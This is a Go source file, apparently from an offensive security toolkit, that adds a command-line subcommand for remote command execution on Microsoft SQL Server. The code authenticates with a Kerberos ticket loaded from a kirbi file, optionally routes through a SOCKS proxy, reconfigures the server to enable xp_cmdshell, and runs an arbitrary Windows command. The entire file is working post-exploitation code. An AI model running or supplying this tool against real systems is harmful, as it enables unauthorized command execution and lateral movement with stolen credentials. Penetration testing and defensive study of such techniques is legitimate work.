package mssql

import (
	"fmt"

	"github.com/spf13/cobra"

	"github.com/vincd/savoir/modules/paquet/krb5"
	"github.com/vincd/savoir/modules/paquet/tds"
	"github.com/vincd/savoir/utils"
)

func init() {
	var host string
	var socks string
	var ticket string
	var shellCmd string

	var xpcmdshellCmd = &cobra.Command{
		Use:   "xp_cmdshell",
		Short: "Execute xp_cmdshell on MSSQL database",
		Long:  `Execute xp_cmdshell on MSSQL database`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			m, err := tds.NewMSSQL(host, 1433)
			if err != nil {
				return err
			}

			dialer, err := utils.GetDialerWithSocks(socks)
			if err != nil {
				return fmt.Errorf("Cannot create dialer client: %s", err)
			}

			if err := m.Connect(dialer); err != nil {
				return fmt.Errorf("cannot connect to mssql database: %s", err)
			}
			defer m.Close()

			fmt.Printf("[*] Use a kirbi file as credentials\n")
			kirbi, err := krb5.NewKrbCredFromFile(ticket)
			if err != nil {
				return fmt.Errorf("cannot load kirbi: %s", err)
			}

			if err := m.LoginWithKerberos(kirbi.Tickets[0], kirbi.DecryptedEncPart.TicketInfo[0]); err != nil {
				return err
			}

			if err := m.Batch("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;"); err != nil {
				return fmt.Errorf("cannot reconfigure database to allow xp_cmdshell: %s", err)
			}

			if err := m.Batch(fmt.Sprintf("exec master..xp_cmdshell %s", shellCmd)); err != nil {
				return err
			}

			return nil
		},
	}

	commandAddMSSQLHostInFlags(xpcmdshellCmd, &host, &socks)
	xpcmdshellCmd.Flags().StringVarP(&ticket, "ticket", "t", "", "Kiribi file")
	xpcmdshellCmd.Flags().StringVarP(&shellCmd, "cmd", "c", "whoami", "Windows command to execute")

	Command.AddCommand(xpcmdshellCmd)
}
